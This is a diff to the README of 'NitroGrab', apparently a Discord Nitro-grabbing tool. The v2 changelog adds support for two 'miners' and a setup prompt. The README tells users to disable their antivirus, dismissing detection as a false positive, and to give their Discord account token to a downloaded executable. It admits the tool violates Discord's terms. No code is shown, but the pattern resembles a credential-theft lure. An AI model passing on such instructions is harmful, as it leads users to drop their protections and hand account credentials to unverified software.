@@ -1,4 +1,4 @@
-## NitroGrab
+## NitroGrab v2
 > :warning: **This is for educational perpose's only as it is against the [DiscordTOS](https://discord.com/terms)**
 
 ## Prerequisites
@@ -7,6 +7,10 @@
 [GIT](https://git-scm.com/downloads)
 
 Turn off Anti-Virus (Detects it as a false positive)
+
+## ChangeLog
+v1 -> v2 Added support for 2 miners
+v1 -> v2 No more editing config files. It will ask you for information during setup
 
 ## 💽Installation
 
@@ -19,13 +23,9 @@ git clone https://github.com/qxis/NitroGrab.git
 ## 💻Usage
 
 ```
-Edit config.json with your discord token
+Run EXE and follow setup instructions
 ```
 if you dont know how to get ur token [look at this video](https://www.youtube.com/watch?v=YEgFvgg7ZPI)
-```
-Open .EXE and install packages
-```
-
 ```
 Re-Open .EXE and click run
 ```
